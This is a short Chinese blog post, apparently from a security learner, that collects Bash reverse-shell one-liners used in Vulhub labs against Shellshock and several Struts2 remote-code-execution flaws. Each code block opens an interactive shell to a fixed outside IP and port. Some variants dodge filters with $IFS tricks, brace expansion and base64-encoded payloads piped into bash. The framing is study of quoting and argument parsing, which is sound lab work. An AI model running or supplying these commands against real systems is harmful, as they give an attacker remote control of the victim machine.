ailx10说：这篇是我2024年10月写的。刷不同漏洞时，反弹 Bash 总在引号、空格和参数边界上变花样，我就把 Shellshock、几个 Struts2 实验里用过的写法收在一起。IFS、重定向、Base64 看着像不同技巧，实际都得放回最外层由谁解析、传给 bash -c 的参数是什么来理解。文章还有待分类的一例，正好保留了当时边学边整理的状态。它不是想做一张按漏洞名挑命令的速查表，更想给自己留一些对照：同一件动作换个输入位置，为什么就得换一种表达。

---

最近刷了Vulhub上的很多命令执行漏洞，涉及到Bash 反弹 Shell 的一些技巧，现在总结如下：

适用于Bash Shellshock 破壳漏洞（CVE-2014-6271）

```
/bin/bash -c "bash -i >& /dev/tcp/144.34.162.13/6666 0>&1"
```

适用于Struts2 S2-061 远程代码执行漏洞

```
/bin/bash -c bash$IFS$9-i>&/dev/tcp/144.34.162.13/6666<&1
```

适用于Struts2 S2-053 远程代码执行漏洞

```
bash -i >& /dev/tcp/144.34.162.13/6666 0>&1
```

适用于Struts2 S2-001 远程代码执行漏洞

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ==} |{base64,-d}|{bash,-i}
```

待分类：

```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ==" | base64 --decode | bash
```

这份汇总更像一叠上下文小卡片，不是任意复制都能用的大全。编码只是换一种表达，理解参数边界以后，才知道为什么有的写法会在半路变形。
